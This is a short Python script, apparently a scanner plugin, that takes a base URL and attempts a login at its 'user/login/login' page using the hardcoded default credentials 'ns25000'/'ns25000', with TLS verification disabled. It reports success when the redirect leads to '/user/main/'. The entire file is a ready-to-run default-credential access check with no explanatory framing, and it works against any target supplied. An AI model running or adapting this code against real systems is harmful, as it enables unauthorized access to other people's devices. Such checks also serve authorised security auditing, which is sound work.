import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"user/login/login"
	body="usrname=ns25000&pass=ns25000&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree="
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 302 and "/user/main/" in response.headers["Location"]:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		r0=False
	if r0:
		return True
	else:
		return False
